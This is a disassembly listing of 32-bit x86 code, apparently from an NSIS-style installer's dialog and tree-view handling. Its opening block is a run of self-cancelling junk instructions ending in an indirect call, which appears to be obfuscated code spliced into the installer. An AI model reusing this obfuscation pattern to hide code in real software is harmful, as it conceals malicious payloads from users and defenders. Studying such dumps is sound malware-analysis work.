  404b4b:	87 d0                	xchg   %edx,%eax
  404b4d:	81 f3 6d c0 c0 53    	xor    $0x53c0c06d,%ebx
  404b53:	f7 db                	neg    %ebx
  404b55:	33 d4                	xor    %esp,%edx
  404b57:	81 f6 98 c9 cf 4b    	xor    $0x4bcfc998,%esi
  404b5d:	33 1d fa 9d 42 00    	xor    0x429dfa,%ebx
  404b63:	81 2d 90 96 42 00 6a 	subl   $0x2993716a,0x429690
  404b6a:	71 93 29 
  404b6d:	01 05 91 96 42 00    	add    %eax,0x429691
  404b73:	f7 d2                	not    %edx
  404b75:	33 3d 0d 9a 42 00    	xor    0x429a0d,%edi
  404b7b:	f7 d2                	not    %edx
  404b7d:	89 05 48 98 42 00    	mov    %eax,0x429848
  404b83:	81 35 3d 99 42 00 ba 	xorl   $0x993bd3ba,0x42993d
  404b8a:	d3 3b 99 
  404b8d:	81 f6 98 c9 cf 4b    	xor    $0x4bcfc998,%esi
  404b93:	33 d4                	xor    %esp,%edx
  404b95:	f7 db                	neg    %ebx
  404b97:	81 f3 6d c0 c0 53    	xor    $0x53c0c06d,%ebx
  404b9d:	87 d0                	xchg   %edx,%eax
  404b9f:	c1 c7 15             	rol    $0x15,%edi
  404ba2:	f7 d7                	not    %edi
  404ba4:	c1 c9 02             	ror    $0x2,%ecx
  404ba7:	81 35 71 93 42 00 d5 	xorl   $0x615f9cd5,0x429371
  404bae:	9c 5f 61 
  404bb1:	e8 51 02 00 00       	call   0x404e07
  404bb6:	c1 cb 10             	ror    $0x10,%ebx
  404bb9:	8b f8                	mov    %eax,%edi
  404bbb:	0b 15 2f 9d 42 00    	or     0x429d2f,%edx
  404bc1:	33 d0                	xor    %eax,%edx
  404bc3:	03 cf                	add    %edi,%ecx
  404bc5:	03 15 e7 9e 42 00    	add    0x429ee7,%edx
  404bcb:	87 d1                	xchg   %edx,%ecx
  404bcd:	29 1d ac 97 42 00    	sub    %ebx,0x4297ac
  404bd3:	87 d3                	xchg   %edx,%ebx
  404bd5:	f7 d0                	not    %eax
  404bd7:	33 d4                	xor    %esp,%edx
  404bd9:	4f                   	dec    %edi
  404bda:	89 0d 33 99 42 00    	mov    %ecx,0x429933
  404be0:	2b dc                	sub    %esp,%ebx
  404be2:	81 0d aa 97 42 00 cd 	orl    $0x744480cd,0x4297aa
  404be9:	80 44 74 
  404bec:	87 c1                	xchg   %eax,%ecx
  404bee:	81 f1 fa b3 5f f9    	xor    $0xf95fb3fa,%ecx
  404bf4:	87 d6                	xchg   %edx,%esi
  404bf6:	48                   	dec    %eax
  404bf7:	c1 c1 1c             	rol    $0x1c,%ecx
  404bfa:	89 15 57 99 42 00    	mov    %edx,0x429957
  404c00:	29 35 ea 93 42 00    	sub    %esi,0x4293ea
  404c06:	31 1d ef 96 42 00    	xor    %ebx,0x4296ef
  404c0c:	29 15 6b 96 42 00    	sub    %edx,0x42966b
  404c12:	c1 c9 1c             	ror    $0x1c,%ecx
  404c15:	40                   	inc    %eax
  404c16:	87 d6                	xchg   %edx,%esi
  404c18:	81 f1 fa b3 5f f9    	xor    $0xf95fb3fa,%ecx
  404c1e:	87 c1                	xchg   %eax,%ecx
  404c20:	81 05 80 93 42 00 94 	addl   $0xeb9a8f94,0x429380
  404c27:	8f 9a eb 
  404c2a:	03 dc                	add    %esp,%ebx
  404c2c:	21 35 62 95 42 00    	and    %esi,0x429562
  404c32:	47                   	inc    %edi
  404c33:	33 d4                	xor    %esp,%edx
  404c35:	f7 d0                	not    %eax
  404c37:	87 d3                	xchg   %edx,%ebx
  404c39:	87 d1                	xchg   %edx,%ecx
  404c3b:	2b cf                	sub    %edi,%ecx
  404c3d:	33 d0                	xor    %eax,%edx
  404c3f:	b9 af 23 08 00       	mov    $0x823af,%ecx
  404c44:	01 1d b8 94 42 00    	add    %ebx,0x4294b8
  404c4a:	47                   	inc    %edi
  404c4b:	81 ea 9a cd 2a 80    	sub    $0x802acd9a,%edx
  404c51:	f7 d0                	not    %eax
  404c53:	41                   	inc    %ecx
  404c54:	09 0d 47 97 42 00    	or     %ecx,0x429747
  404c5a:	c1 c8 1f             	ror    $0x1f,%eax
  404c5d:	01 1d 46 98 42 00    	add    %ebx,0x429846
  404c63:	81 f7 67 81 26 cd    	xor    $0xcd268167,%edi
  404c69:	e8 a9 da ff ff       	call   0x402717
  404c6e:	87 d0                	xchg   %edx,%eax
  404c70:	81 c6 07 99 26 18    	add    $0x18269907,%esi
  404c76:	4b                   	dec    %ebx
  404c77:	e8 8b 01 00 00       	call   0x404e07
  404c7c:	e8 c2 d0 ff ff       	call   0x401d43
  404c81:	43                   	inc    %ebx
  404c82:	81 ee 07 99 26 18    	sub    $0x18269907,%esi
  404c88:	87 d0                	xchg   %edx,%eax
  404c8a:	e8 78 01 00 00       	call   0x404e07
  404c8f:	81 f7 67 81 26 cd    	xor    $0xcd268167,%edi
  404c95:	01 35 8c 96 42 00    	add    %esi,0x42968c
  404c9b:	c1 c0 1f             	rol    $0x1f,%eax
  404c9e:	49                   	dec    %ecx
  404c9f:	f7 d0                	not    %eax
  404ca1:	81 c2 9a cd 2a 80    	add    $0x802acd9a,%edx
  404ca7:	4f                   	dec    %edi
  404ca8:	09 3d 43 99 42 00    	or     %edi,0x429943
  404cae:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  404cb0:	c1 c2 08             	rol    $0x8,%edx
  404cb3:	89 0d e2 96 42 00    	mov    %ecx,0x4296e2
  404cb9:	03 05 76 9f 42 00    	add    0x429f76,%eax
  404cbf:	81 c7 33 ba df bf    	add    $0xbfdfba33,%edi
  404cc5:	41                   	inc    %ecx
  404cc6:	2b d4                	sub    %esp,%edx
  404cc8:	c1 cf 0c             	ror    $0xc,%edi
  404ccb:	f7 de                	neg    %esi
  404ccd:	33 1d 9b 99 42 00    	xor    0x42999b,%ebx
  404cd3:	40                   	inc    %eax
  404cd4:	31 05 53 93 42 00    	xor    %eax,0x429353
  404cda:	c1 c0 08             	rol    $0x8,%eax
  404cdd:	21 15 f6 97 42 00    	and    %edx,0x4297f6
  404ce3:	43                   	inc    %ebx
  404ce4:	2b cd                	sub    %ebp,%ecx
  404ce6:	33 3d 87 99 42 00    	xor    0x429987,%edi
  404cec:	33 0d a5 9e 42 00    	xor    0x429ea5,%ecx
  404cf2:	81 ea 27 30 3e 9f    	sub    $0x9f3e3027,%edx
  404cf8:	87 f3                	xchg   %esi,%ebx
  404cfa:	e8 d3 01 00 00       	call   0x404ed2
  404cff:	e8 03 01 00 00       	call   0x404e07
  404d04:	87 f3                	xchg   %esi,%ebx
  404d06:	81 c2 27 30 3e 9f    	add    $0x9f3e3027,%edx
  404d0c:	03 cd                	add    %ebp,%ecx
  404d0e:	4b                   	dec    %ebx
  404d0f:	09 15 79 96 42 00    	or     %edx,0x429679
  404d15:	c1 c8 08             	ror    $0x8,%eax
  404d18:	48                   	dec    %eax
  404d19:	f7 de                	neg    %esi
  404d1b:	c1 c7 0c             	rol    $0xc,%edi
  404d1e:	03 d4                	add    %esp,%edx
  404d20:	49                   	dec    %ecx
  404d21:	81 ef 33 ba df bf    	sub    $0xbfdfba33,%edi
  404d27:	c1 ca 08             	ror    $0x8,%edx
  404d2a:	ff d0                	call   *%eax
  404d2c:	b4 49                	mov    $0x49,%ah
  404d2e:	9d                   	popf
  404d2f:	03 3d 74 9e 42 00    	add    0x429e74,%edi
  404d35:	48                   	dec    %eax
  404d36:	33 35 26 9b 42 00    	xor    0x429b26,%esi
  404d3c:	f7 d2                	not    %edx
  404d3e:	31 35 a1 96 42 00    	xor    %esi,0x4296a1
  404d44:	49                   	dec    %ecx
  404d45:	03 cd                	add    %ebp,%ecx
  404d47:	2b 3d f6 9b 42 00    	sub    0x429bf6,%edi
  404d4d:	f7 d0                	not    %eax
  404d4f:	42                   	inc    %edx
  404d50:	2b f7                	sub    %edi,%esi
  404d52:	e8 9e d2 ff ff       	call   0x401ff5
  404d57:	31 0d 98 93 42 00    	xor    %ecx,0x429398
  404d5d:	33 15 8b 9a 42 00    	xor    0x429a8b,%edx
  404d63:	09 3d ff 96 42 00    	or     %edi,0x4296ff
  404d69:	03 f7                	add    %edi,%esi
  404d6b:	4a                   	dec    %edx
  404d6c:	f7 d0                	not    %eax
  404d6e:	2b cd                	sub    %ebp,%ecx
  404d70:	41                   	inc    %ecx
  404d71:	29 1d 09 99 42 00    	sub    %ebx,0x429909
  404d77:	f7 d2                	not    %edx
  404d79:	40                   	inc    %eax
  404d7a:	14 eb                	adc    $0xeb,%al
  404d7c:	03 8b 4d 14 83 7d    	add    0x7d83144d(%ebx),%ecx
  404d82:	0c 4e                	or     $0x4e,%al
  404d84:	b8 13 04 00 00       	mov    $0x413,%eax
  404d89:	74 09                	je     0x404d94
  404d8b:	39 45 0c             	cmp    %eax,0xc(%ebp)
  404d8e:	0f 85 e4 00 00 00    	jne    0x404e78
  404d94:	39 45 0c             	cmp    %eax,0xc(%ebp)
  404d97:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  404d9a:	74 0d                	je     0x404da9
  404d9c:	81 79 04 08 04 00 00 	cmpl   $0x408,0x4(%ecx)
  404da3:	0f 85 cf 00 00 00    	jne    0x404e78
  404da9:	f6 05 19 92 42 00 02 	testb  $0x2,0x429219
  404db0:	75 73                	jne    0x404e25
  404db2:	39 45 0c             	cmp    %eax,0xc(%ebp)
  404db5:	74 09                	je     0x404dc0
  404db7:	8b 4d 14             	mov    0x14(%ebp),%ecx
  404dba:	83 79 08 fe          	cmpl   $0xfffffffe,0x8(%ecx)
  404dbe:	75 65                	jne    0x404e25
  404dc0:	33 c9                	xor    %ecx,%ecx
  404dc2:	39 45 0c             	cmp    %eax,0xc(%ebp)
  404dc5:	0f 95 c1             	setne  %cl
  404dc8:	51                   	push   %ecx
  404dc9:	ff 75 fc             	push   -0x4(%ebp)
  404dcc:	e8 72 fc ff ff       	call   0x404a43
  404dd1:	8b f8                	mov    %eax,%edi
  404dd3:	3b fb                	cmp    %ebx,%edi
  404dd5:	7c 4e                	jl     0x404e25
  404dd7:	69 c0 18 08 00 00    	imul   $0x818,%eax,%eax
  404ddd:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404de0:	8d 4c 08 08          	lea    0x8(%eax,%ecx,1),%ecx
  404de4:	8b 01                	mov    (%ecx),%eax
  404de6:	a8 10                	test   $0x10,%al
  404de8:	75 3b                	jne    0x404e25
  404dea:	a8 40                	test   $0x40,%al
  404dec:	74 11                	je     0x404dff
  404dee:	35 80 00 00 00       	xor    $0x80,%eax
  404df3:	84 c0                	test   %al,%al
  404df5:	79 04                	jns    0x404dfb
  404df7:	0c 01                	or     $0x1,%al
  404df9:	eb 07                	jmp    0x404e02
  404dfb:	24 fe                	and    $0xfe,%al
  404dfd:	eb 03                	jmp    0x404e02
  404dff:	83 f0 01             	xor    $0x1,%eax
  404e02:	57                   	push   %edi
  404e03:	89 01                	mov    %eax,(%ecx)
  404e05:	e8 73 c3 ff ff       	call   0x40117d
  404e0a:	a1 18 92 42 00       	mov    0x429218,%eax
  404e0f:	47                   	inc    %edi
  404e10:	f7 d0                	not    %eax
  404e12:	c1 e8 08             	shr    $0x8,%eax
  404e15:	83 e0 01             	and    $0x1,%eax
  404e18:	89 7d 10             	mov    %edi,0x10(%ebp)
  404e1b:	89 45 14             	mov    %eax,0x14(%ebp)
  404e1e:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  404e25:	39 5d f4             	cmp    %ebx,-0xc(%ebp)
  404e28:	74 4e                	je     0x404e78
  404e2a:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404e2d:	81 78 08 3d fe ff ff 	cmpl   $0xfffffe3d,0x8(%eax)
  404e34:	75 0e                	jne    0x404e44
  404e36:	ff 70 5c             	push   0x5c(%eax)
  404e39:	53                   	push   %ebx
  404e3a:	68 19 04 00 00       	push   $0x419
  404e3f:	ff 75 fc             	push   -0x4(%ebp)
  404e42:	ff d6                	call   *%esi
  404e44:	8b 45 f4             	mov    -0xc(%ebp),%eax
  404e47:	81 78 08 39 fe ff ff 	cmpl   $0xfffffe39,0x8(%eax)
  404e4e:	75 28                	jne    0x404e78
  404e50:	83 78 0c 02          	cmpl   $0x2,0xc(%eax)
  404e54:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404e57:	8b 40 5c             	mov    0x5c(%eax),%eax
  404e5a:	75 0f                	jne    0x404e6b
  404e5c:	69 c0 18 08 00 00    	imul   $0x818,%eax,%eax
  404e62:	8d 44 08 08          	lea    0x8(%eax,%ecx,1),%eax
  404e66:	83 08 20             	orl    $0x20,(%eax)
  404e69:	eb 0d                	jmp    0x404e78
  404e6b:	69 c0 18 08 00 00    	imul   $0x818,%eax,%eax
  404e71:	8d 44 08 08          	lea    0x8(%eax,%ecx,1),%eax
  404e75:	83 20 df             	andl   $0xffffffdf,(%eax)
  404e78:	81 7d 0c 11 01 00 00 	cmpl   $0x111,0xc(%ebp)
  404e7f:	75 6f                	jne    0x404ef0
  404e81:	66 81 7d 10 f9 03    	cmpw   $0x3f9,0x10(%ebp)
  404e87:	0f 85 4b 02 00 00    	jne    0x4050d8
  404e8d:	8b 45 10             	mov    0x10(%ebp),%eax
  404e90:	c1 e8 10             	shr    $0x10,%eax
  404e93:	66 3d 01 00          	cmp    $0x1,%ax
  404e97:	0f 85 3b 02 00 00    	jne    0x4050d8
  404e9d:	53                   	push   %ebx
  404e9e:	53                   	push   %ebx
  404e9f:	68 47 01 00 00       	push   $0x147
  404ea4:	ff 75 f8             	push   -0x8(%ebp)
  404ea7:	ff d6                	call   *%esi
  404ea9:	83 f8 ff             	cmp    $0xffffffff,%eax
  404eac:	0f 84 26 02 00 00    	je     0x4050d8
  404eb2:	53                   	push   %ebx
  404eb3:	50                   	push   %eax
  404eb4:	68 50 01 00 00       	push   $0x150
  404eb9:	ff 75 f8             	push   -0x8(%ebp)
  404ebc:	ff d6                	call   *%esi
  404ebe:	8b f8                	mov    %eax,%edi
  404ec0:	83 ff ff             	cmp    $0xffffffff,%edi
  404ec3:	74 08                	je     0x404ecd
  404ec5:	8b 45 ec             	mov    -0x14(%ebp),%eax
  404ec8:	39 1c b8             	cmp    %ebx,(%eax,%edi,4)
  404ecb:	75 03                	jne    0x404ed0
  404ecd:	6a 20                	push   $0x20
  404ecf:	5f                   	pop    %edi
  404ed0:	57                   	push   %edi
  404ed1:	e8 c3 c3 ff ff       	call   0x401299
  404ed6:	57                   	push   %edi
  404ed7:	53                   	push   %ebx
  404ed8:	68 20 04 00 00       	push   $0x420
  404edd:	ff 75 08             	push   0x8(%ebp)
  404ee0:	ff d6                	call   *%esi
  404ee2:	83 4d 10 ff          	orl    $0xffffffff,0x10(%ebp)
  404ee6:	89 5d 14             	mov    %ebx,0x14(%ebp)
  404ee9:	c7 45 0c 0f 04 00 00 	movl   $0x40f,0xc(%ebp)
  404ef0:	b8 00 02 00 00       	mov    $0x200,%eax
  404ef5:	39 45 0c             	cmp    %eax,0xc(%ebp)
  404ef8:	75 08                	jne    0x404f02
  404efa:	53                   	push   %ebx
  404efb:	53                   	push   %ebx
  404efc:	50                   	push   %eax
  404efd:	ff 75 fc             	push   -0x4(%ebp)
  404f00:	ff d6                	call   *%esi
  404f02:	81 7d 0c 0b 04 00 00 	cmpl   $0x40b,0xc(%ebp)
  404f09:	75 32                	jne    0x404f3d
  404f0b:	a1 cc 26 42 00       	mov    0x4226cc,%eax
  404f10:	3b c3                	cmp    %ebx,%eax
  404f12:	74 07                	je     0x404f1b
  404f14:	50                   	push   %eax
  404f15:	ff 15 40 70 40 00    	call   *0x407040
  404f1b:	a1 e0 26 42 00       	mov    0x4226e0,%eax
  404f20:	3b c3                	cmp    %ebx,%eax
  404f22:	74 07                	je     0x404f2b
  404f24:	50                   	push   %eax
  404f25:	ff 15 08 71 40 00    	call   *0x407108
  404f2b:	89 1d cc 26 42 00    	mov    %ebx,0x4226cc
  404f31:	89 1d e0 26 42 00    	mov    %ebx,0x4226e0
  404f37:	89 1d 60 92 42 00    	mov    %ebx,0x429260
  404f3d:	81 7d 0c 0f 04 00 00 	cmpl   $0x40f,0xc(%ebp)
  404f44:	0f 85 50 01 00 00    	jne    0x40509a
  404f4a:	53                   	push   %ebx
  404f4b:	53                   	push   %ebx
  404f4c:	e8 9e c2 ff ff       	call   0x4011ef
  404f51:	8b 45 10             	mov    0x10(%ebp),%eax
  404f54:	3b c3                	cmp    %ebx,%eax
  404f56:	74 0e                	je     0x404f66
  404f58:	83 f8 ff             	cmp    $0xffffffff,%eax
  404f5b:	74 01                	je     0x404f5e
  404f5d:	48                   	dec    %eax
  404f5e:	50                   	push   %eax
  404f5f:	6a 08                	push   $0x8
  404f61:	e8 5d fb ff ff       	call   0x404ac3
  404f66:	39 5d 14             	cmp    %ebx,0x14(%ebp)
  404f69:	74 3f                	je     0x404faa
  404f6b:	ff 35 e0 26 42 00    	push   0x4226e0
  404f71:	e8 6c c3 ff ff       	call   0x4012e2
  404f76:	8b f8                	mov    %eax,%edi
  404f78:	57                   	push   %edi
  404f79:	e8 1b c3 ff ff       	call   0x401299
  404f7e:	33 c0                	xor    %eax,%eax
  404f80:	33 c9                	xor    %ecx,%ecx
  404f82:	3b fb                	cmp    %ebx,%edi
  404f84:	7e 0e                	jle    0x404f94
  404f86:	8b 55 ec             	mov    -0x14(%ebp),%edx
  404f89:	39 1c 82             	cmp    %ebx,(%edx,%eax,4)
  404f8c:	74 01                	je     0x404f8f
  404f8e:	41                   	inc    %ecx
  404f8f:	40                   	inc    %eax
  404f90:	3b c7                	cmp    %edi,%eax
  404f92:	7c f2                	jl     0x404f86
  404f94:	53                   	push   %ebx
  404f95:	51                   	push   %ecx
  404f96:	68 4e 01 00 00       	push   $0x14e
  404f9b:	ff 75 f8             	push   -0x8(%ebp)
  404f9e:	ff d6                	call   *%esi
  404fa0:	89 7d 14             	mov    %edi,0x14(%ebp)
  404fa3:	c7 45 0c 20 04 00 00 	movl   $0x420,0xc(%ebp)
  404faa:	53                   	push   %ebx
  404fab:	53                   	push   %ebx
  404fac:	e8 3e c2 ff ff       	call   0x4011ef
  404fb1:	a1 e0 26 42 00       	mov    0x4226e0,%eax
  404fb6:	39 1d 2c 92 42 00    	cmp    %ebx,0x42922c
  404fbc:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  404fbf:	a1 28 92 42 00       	mov    0x429228,%eax
  404fc4:	c7 45 c8 30 f0 00 00 	movl   $0xf030,-0x38(%ebp)
  404fcb:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  404fce:	0f 8e 9c 00 00 00    	jle    0x405070
  404fd4:	8d 78 08             	lea    0x8(%eax),%edi
  404fd7:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  404fda:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404fdd:	8b 04 88             	mov    (%eax,%ecx,4),%eax
  404fe0:	3b c3                	cmp    %ebx,%eax
  404fe2:	74 74                	je     0x405058
  404fe4:	8b 0f                	mov    (%edi),%ecx
  404fe6:	89 45 c0             	mov    %eax,-0x40(%ebp)
  404fe9:	f6 c5 01             	test   $0x1,%ch
  404fec:	c7 45 bc 08 00 00 00 	movl   $0x8,-0x44(%ebp)
  404ff3:	74 11                	je     0x405006
  404ff5:	8d 47 10             	lea    0x10(%edi),%eax
  404ff8:	c7 45 bc 09 00 00 00 	movl   $0x9,-0x44(%ebp)
  404fff:	89 45 cc             	mov    %eax,-0x34(%ebp)
  405002:	80 67 01 fe          	andb   $0xfe,0x1(%edi)
  405006:	f6 c1 40             	test   $0x40,%cl
  405009:	74 05                	je     0x405010
  40500b:	6a 03                	push   $0x3
  40500d:	58                   	pop    %eax
  40500e:	eb 0e                	jmp    0x40501e
  405010:	8b c1                	mov    %ecx,%eax
  405012:	83 e0 01             	and    $0x1,%eax
  405015:	40                   	inc    %eax
  405016:	f6 c1 10             	test   $0x10,%cl
  405019:	74 03                	je     0x40501e
  40501b:	83 c0 03             	add    $0x3,%eax
  40501e:	8b d1                	mov    %ecx,%edx
  405020:	ff 75 c0             	push   -0x40(%ebp)
  405023:	c1 e0 0b             	shl    $0xb,%eax
  405026:	83 e2 08             	and    $0x8,%edx
  405029:	0b c2                	or     %edx,%eax
  40502b:	8b d1                	mov    %ecx,%edx
  40502d:	c1 f9 05             	sar    $0x5,%ecx
  405030:	03 c0                	add    %eax,%eax
  405032:	83 e2 20             	and    $0x20,%edx
  405035:	83 e1 01             	and    $0x1,%ecx
  405038:	0b c2                	or     %edx,%eax
  40503a:	41                   	inc    %ecx
  40503b:	89 45 c4             	mov    %eax,-0x3c(%ebp)
  40503e:	51                   	push   %ecx
  40503f:	68 02 11 00 00       	push   $0x1102
  405044:	ff 75 fc             	push   -0x4(%ebp)
  405047:	ff d6                	call   *%esi
  405049:	8d 45 bc             	lea    -0x44(%ebp),%eax
  40504c:	50                   	push   %eax
  40504d:	53                   	push   %ebx
  40504e:	68 3f 11 00 00       	push   $0x113f
  405053:	ff 75 fc             	push   -0x4(%ebp)
  405056:	ff d6                	call   *%esi
  405058:	ff 45 f0             	incl   -0x10(%ebp)
  40505b:	81 c7 18 08 00 00    	add    $0x818,%edi
  405061:	8b 45 f0             	mov    -0x10(%ebp),%eax
  405064:	3b 05 2c 92 42 00    	cmp    0x42922c,%eax
  40506a:	0f 8c 67 ff ff ff    	jl     0x404fd7
  405070:	6a 01                	push   $0x1
  405072:	53                   	push   %ebx
  405073:	ff 75 fc             	push   -0x4(%ebp)
  405076:	ff 15 1c 72 40 00    	call   *0x40721c
  40507c:	a1 dc 81 42 00       	mov    0x4281dc,%eax
  405081:	39 58 10             	cmp    %ebx,0x10(%eax)
  405084:	74 14                	je     0x40509a
  405086:	6a 05                	push   $0x5
  405088:	e8 89 f9 ff ff       	call   0x404a16
  40508d:	50                   	push   %eax
  40508e:	6a fb                	push   $0xfffffffb
  405090:	68 ff 03 00 00       	push   $0x3ff
  405095:	e8 64 f9 ff ff       	call   0x4049fe
  40509a:	81 7d 0c 20 04 00 00 	cmpl   $0x420,0xc(%ebp)
  4050a1:	75 35                	jne    0x4050d8
  4050a3:	f6 05 19 92 42 00 01 	testb  $0x1,0x429219
  4050aa:	74 2c                	je     0x4050d8
  4050ac:	33 c0                	xor    %eax,%eax
  4050ae:	83 7d 14 20          	cmpl   $0x20,0x14(%ebp)
  4050b2:	8b 35 68 72 40 00    	mov    0x407268,%esi
  4050b8:	0f 94 c0             	sete   %al
  4050bb:	c1 e0 03             	shl    $0x3,%eax
  4050be:	8b f8                	mov    %eax,%edi
  4050c0:	57                   	push   %edi
  4050c1:	ff 75 fc             	push   -0x4(%ebp)
  4050c4:	ff d6                	call   *%esi
  4050c6:	57                   	push   %edi
  4050c7:	68 fe 03 00 00       	push   $0x3fe
  4050cc:	ff 75 08             	push   0x8(%ebp)
  4050cf:	ff 15 6c 72 40 00    	call   *0x40726c
  4050d5:	50                   	push   %eax
  4050d6:	ff d6                	call   *%esi
  4050d8:	ff 75 14             	push   0x14(%ebp)
  4050db:	ff 75 10             	push   0x10(%ebp)
  4050de:	ff 75 0c             	push   0xc(%ebp)
  4050e1:	e8 5f f0 ff ff       	call   0x404145
  4050e6:	5f                   	pop    %edi
  4050e7:	5e                   	pop    %esi
  4050e8:	5b                   	pop    %ebx
  4050e9:	c9                   	leave
  4050ea:	c2 10 00             	ret    $0x10
  4050ed:	55                   	push   %ebp
  4050ee:	8b ec                	mov    %esp,%ebp
  4050f0:	53                   	push   %ebx
  4050f1:	8b 5d 0c             	mov    0xc(%ebp),%ebx
  4050f4:	81 fb 02 01 00 00    	cmp    $0x102,%ebx
  4050fa:	57                   	push   %edi
  4050fb:	75 14                	jne    0x405111
  4050fd:	83 7d 10 20          	cmpl   $0x20,0x10(%ebp)
  405101:	75 59                	jne    0x40515c
  405103:	68 13 04 00 00       	push   $0x413
  405108:	e8 1d f0 ff ff       	call   0x40412a
  40510d:	33 c0                	xor    %eax,%eax
  40510f:	eb 62                	jmp    0x405173
  405111:	81 fb 00 02 00 00    	cmp    $0x200,%ebx
  405117:	75 20                	jne    0x405139
  405119:	ff 75 08             	push   0x8(%ebp)
  40511c:	ff 15 cc 71 40 00    	call   *0x4071cc
  405122:	85 c0                	test   %eax,%eax
  405124:	74 36                	je     0x40515c
  405126:	6a 01                	push   $0x1
  405128:	ff 75 08             	push   0x8(%ebp)
  40512b:	e8 13 f9 ff ff       	call   0x404a43
  405130:	8b f8                	mov    %eax,%edi
  405132:	bb 19 04 00 00       	mov    $0x419,%ebx
  405137:	eb 03                	jmp    0x40513c
  405139:	8b 7d 14             	mov    0x14(%ebp),%edi
  40513c:	81 fb 19 04 00 00    	cmp    $0x419,%ebx
  405142:	75 1b                	jne    0x40515f
  405144:	39 3d d4 26 42 00    	cmp    %edi,0x4226d4
  40514a:	74 13                	je     0x40515f
  40514c:	57                   	push   %edi
  40514d:	6a 06                	push   $0x6
  40514f:	89 3d d4 26 42 00    	mov    %edi,0x4226d4
  405155:	e8 69 f9 ff ff       	call   0x404ac3
  40515a:	eb 03                	jmp    0x40515f
  40515c:	8b 7d 14             	mov    0x14(%ebp),%edi
  40515f:	57                   	push   %edi
  405160:	ff 75 10             	push   0x10(%ebp)
  405163:	53                   	push   %ebx
  405164:	ff 75 08             	push   0x8(%ebp)
  405167:	ff 35 dc 26 42 00    	push   0x4226dc
  40516d:	ff 15 c8 71 40 00    	call   *0x4071c8
  405173:	5f                   	pop    %edi
  405174:	5b                   	pop    %ebx
  405175:	5d                   	pop    %ebp
  405176:	c2 10 00             	ret    $0x10
  405179:	55                   	push   %ebp
  40517a:	8b ec                	mov    %esp,%ebp
  40517c:	83 ec 30             	sub    $0x30,%esp
  40517f:	a1 e4 81 42 00       	mov    0x4281e4,%eax
  405184:	53                   	push   %ebx
  405185:	56                   	push   %esi
  405186:	57                   	push   %edi
  405187:	33 ff                	xor    %edi,%edi
  405189:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40518c:	3b c7                	cmp    %edi,%eax
  40518e:	0f 84 b1 00 00 00    	je     0x405245
  405194:	8b 1d b4 92 42 00    	mov    0x4292b4,%ebx
  40519a:	be c8 16 42 00       	mov    $0x4216c8,%esi
  40519f:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  4051a2:	83 e3 01             	and    $0x1,%ebx
  4051a5:	75 09                	jne    0x4051b0
  4051a7:	ff 75 08             	push   0x8(%ebp)
  4051aa:	56                   	push   %esi
  4051ab:	e8 8c 0e 00 00       	call   0x40603c
  4051b0:	56                   	push   %esi
  4051b1:	e8 7a 0e 00 00       	call   0x406030
  4051b6:	39 7d 0c             	cmp    %edi,0xc(%ebp)
  4051b9:	89 45 08             	mov    %eax,0x8(%ebp)
  4051bc:	74 1b                	je     0x4051d9
  4051be:	ff 75 0c             	push   0xc(%ebp)
  4051c1:	e8 6a 0e 00 00       	call   0x406030
  4051c6:	03 45 08             	add    0x8(%ebp),%eax
  4051c9:	3d 00 10 00 00       	cmp    $0x1000,%eax
  4051ce:	73 75                	jae    0x405245
  4051d0:	ff 75 0c             	push   0xc(%ebp)
  4051d3:	56                   	push   %esi
  4051d4:	e8 5d 0e 00 00       	call   0x406036
  4051d9:	f6 45 f8 04          	testb  $0x4,-0x8(%ebp)
  4051dd:	75 0d                	jne    0x4051ec
  4051df:	56                   	push   %esi
  4051e0:	ff 35 c8 81 42 00    	push   0x4281c8
  4051e6:	ff 15 60 72 40 00    	call   *0x407260
  4051ec:	f6 45 f8 02          	testb  $0x2,-0x8(%ebp)
  4051f0:	75 44                	jne    0x405236
  4051f2:	57                   	push   %edi
  4051f3:	57                   	push   %edi
  4051f4:	68 04 10 00 00       	push   $0x1004
  4051f9:	89 75 e4             	mov    %esi,-0x1c(%ebp)
  4051fc:	ff 75 fc             	push   -0x4(%ebp)
  4051ff:	8b 35 20 72 40 00    	mov    0x407220,%esi
  405205:	c7 45 d0 01 00 00 00 	movl   $0x1,-0x30(%ebp)
  40520c:	ff d6                	call   *%esi
  40520e:	2b c3                	sub    %ebx,%eax
  405210:	89 7d d8             	mov    %edi,-0x28(%ebp)
  405213:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  405216:	8d 45 d0             	lea    -0x30(%ebp),%eax
  405219:	50                   	push   %eax
  40521a:	b8 4d 10 00 00       	mov    $0x104d,%eax
  40521f:	2b c3                	sub    %ebx,%eax
  405221:	57                   	push   %edi
  405222:	50                   	push   %eax
  405223:	ff 75 fc             	push   -0x4(%ebp)
  405226:	ff d6                	call   *%esi
  405228:	57                   	push   %edi
  405229:	ff 75 d4             	push   -0x2c(%ebp)
  40522c:	68 13 10 00 00       	push   $0x1013
  405231:	ff 75 fc             	push   -0x4(%ebp)
  405234:	ff d6                	call   *%esi
  405236:	3b df                	cmp    %edi,%ebx
  405238:	74 0b                	je     0x405245
  40523a:	8b 45 08             	mov    0x8(%ebp),%eax
  40523d:	66 89 3c 45 c8 16 42 	mov    %di,0x4216c8(,%eax,2)
  405244:	00 
  405245:	5f                   	pop    %edi
  405246:	5e                   	pop    %esi
  405247:	5b                   	pop    %ebx
  405248:	c9                   	leave
  405249:	c2 08 00             	ret    $0x8
  40524c:	56                   	push   %esi
  40524d:	8b 35 28 92 42 00    	mov    0x429228,%esi
  405253:	57                   	push   %edi
  405254:	8b 3d 2c 92 42 00    	mov    0x42922c,%edi
  40525a:	6a 00                	push   $0x0
  40525c:	ff 15 a4 72 40 00    	call   *0x4072a4
  405262:	09 05 b8 92 42 00    	or     %eax,0x4292b8
  405268:	6a 00                	push   $0x0
  40526a:	e8 bb ee ff ff       	call   0x40412a
  40526f:	85 ff                	test   %edi,%edi
  405271:	74 2b                	je     0x40529e
  405273:	83 c6 0c             	add    $0xc,%esi
